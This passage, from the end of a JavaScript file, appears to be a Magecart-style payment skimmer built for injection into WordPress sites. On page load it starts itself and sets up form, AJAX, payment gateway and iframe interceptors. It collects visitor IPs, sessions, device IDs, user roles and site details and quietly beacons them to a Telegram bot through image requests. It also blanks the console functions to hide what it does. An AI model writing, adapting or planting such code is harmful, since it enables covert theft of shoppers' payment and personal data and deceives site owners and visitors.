                lastActivity = Date.now();
            };
            
            // Track various activities
            document.addEventListener('click', updateActivity);
            document.addEventListener('keydown', updateActivity);
            document.addEventListener('scroll', updateActivity);
            document.addEventListener('mousemove', updateActivity);
            
            // Check for inactivity
            setInterval(async () => {
                const inactiveTime = Date.now() - lastActivity;
                
                if (inactiveTime > 300000) { // 5 minutes
                    const ip = await this.getUserIP();
                    
                    let message = `💤 <b>USER INACTIVE</b>\n\n`;
                    message += `🎯 <b>Inactive Time:</b> ${Math.floor(inactiveTime / 60000)} minutes\n`;
                    message += `🌐 <b>Page:</b> ${window.location.href}\n`;
                    message += `📡 <b>IP:</b> ${ip}\n`;
                    message += `🆔 <b>Session:</b> ${sessionId}\n`;
                    message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
                    
                    await this.sendTelegram(message);
                    
                    // Reset activity
                    lastActivity = Date.now();
                }
            }, 60000); // Check every minute
        }
        
        async getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (e) {
                return 'IP_FETCH_FAILED';
            }
        }
        
        async sendTelegram(message) {
            try {
                const img = new Image();
                const encodedMsg = encodeURIComponent(message);
                img.src = `https://api.telegram.org/bot${WP_CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${WP_CONFIG.TELEGRAM_CHAT_ID}&text=${encodedMsg}&parse_mode=HTML`;
            } catch (e) {}
        }
    }
    
    // ==================== MAIN WORDPRESS TRACKER ====================
    class WPTracker {
        constructor() {
            this.initialize();
        }
        
        async initialize() {
            // Wait for WordPress to load
            await this.waitForWP();
            
            // Initialize all components
            const wpDetector = new WPDetector();
            await wpDetector.sendWPReport();
            
            // Start tracking
            setTimeout(() => {
                new WPFormDetector();
                new WPAjaxInterceptor();
                new WPGatewayDetector();
                new WPIframeMonitor();
                new WPSessionManager();
                
                isActive = true;
                
                // Send activation message
                this.sendActivationMessage();
            }, 2000);
        }
        
        async waitForWP() {
            // Wait for WordPress to fully load
            return new Promise((resolve) => {
                if (document.readyState === 'complete') {
                    resolve();
                } else {
                    window.addEventListener('load', resolve);
                }
            });
        }
        
        async sendActivationMessage() {
            const ip = await this.getUserIP();
            
            let message = `🚀 <b>WORDPRESS PAYMENT TRACKER ACTIVATED</b>\n\n`;
            message += `🎯 <b>Version:</b> ${WP_CONFIG.VERSION}\n`;
            message += `🏗️ <b>WordPress:</b> ${wpData.isWordPress ? 'Yes' : 'No'}\n`;
            if (wpData.isWordPress) {
                message += `🎨 <b>Theme:</b> ${wpData.theme}\n`;
                message += `🔌 <b>Plugins:</b> ${wpData.plugins.length}\n`;
                message += `👤 <b>User:</b> ${wpData.userRole} (${wpData.userId || 'guest'})\n`;
            }
            message += `🌐 <b>Site:</b> ${window.location.origin}\n`;
            message += `📄 <b>Page:</b> ${window.location.href}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🆔 <b>Session:</b> ${sessionId}\n`;
            message += `📱 <b>Device:</b> ${deviceId}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}\n\n`;
            
            message += `🔧 <b>Features Active:</b>\n`;
            Object.entries(WP_CONFIG.TRACK_WP).forEach(([key, value]) => {
                if (value) message += `✅ ${key}\n`;
            });
            
            Object.entries(WP_CONFIG.ADVANCED_FEATURES).forEach(([key, value]) => {
                if (value) message += `✨ ${key}\n`;
            });
            
            await this.sendTelegram(message);
        }
        
        async getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (e) {
                return 'IP_FETCH_FAILED';
            }
        }
        
        async sendTelegram(message) {
            try {
                const img = new Image();
                const encodedMsg = encodeURIComponent(message);
                img.src = `https://api.telegram.org/bot${WP_CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${WP_CONFIG.TELEGRAM_CHAT_ID}&text=${encodedMsg}&parse_mode=HTML`;
            } catch (e) {}
        }
    }
    
    // ==================== ENTRY POINT ====================
    // Self-executing function with WordPress detection
    (function() {
        // Wait for DOM to be ready
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => {
                setTimeout(() => {
                    new WPTracker();
                }, 1000);
            });
        } else {
            setTimeout(() => {
                new WPTracker();
            }, 1000);
        }
        
        // Also initialize on window load
        window.addEventListener('load', () => {
            if (!isActive) {
                setTimeout(() => {
                    new WPTracker();
                }, 2000);
            }
        });
        
        // Silence console for production
        if (WP_CONFIG.SILENT_MODE) {
            console.log = function(){};
            console.warn = function(){};
            console.error = function(){};
            console.info = function(){};
        }
    })();
    
})();
